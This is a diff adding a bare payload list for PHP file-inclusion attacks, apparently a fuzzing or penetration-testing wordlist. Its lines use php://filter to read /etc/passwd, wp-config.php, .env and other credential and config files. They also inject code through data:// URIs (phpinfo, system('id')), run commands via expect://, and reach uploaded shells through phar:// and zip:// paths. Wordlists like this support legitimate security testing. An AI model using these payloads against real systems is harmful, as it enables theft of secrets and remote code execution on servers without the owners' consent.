@@ -1,0 +1,32 @@
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../config.php
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/string.toupper/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
+php://filter/convert.base64-decode/convert.base64-encode/resource=/etc/passwd
+php://input
+php://stdin
+php://memory
+php://temp
+php://fd/0
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+data://text/plain,<?php phpinfo();?>
+data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+data://text/plain,<?php system('id');?>
+phar://./upload/file.jpg/shell
+phar:///var/www/html/uploads/file.jpg/exploit
+zip://upload/test.zip%23shell.php
+zip:///var/www/html/uploads/shell.zip#payload.php
+expect://id
+expect://ls
+expect://whoami
+php://filter/convert.base64-encode/resource=wp-config.php
+php://filter/convert.base64-encode/resource=.env
+php://filter/convert.base64-encode/resource=settings.py
+php://filter/convert.base64-encode/resource=app/config/parameters.yml
+php://filter/convert.base64-encode/resource=application.properties
+php://filter/resource=/proc/self/environ
+glob://etc/pass*
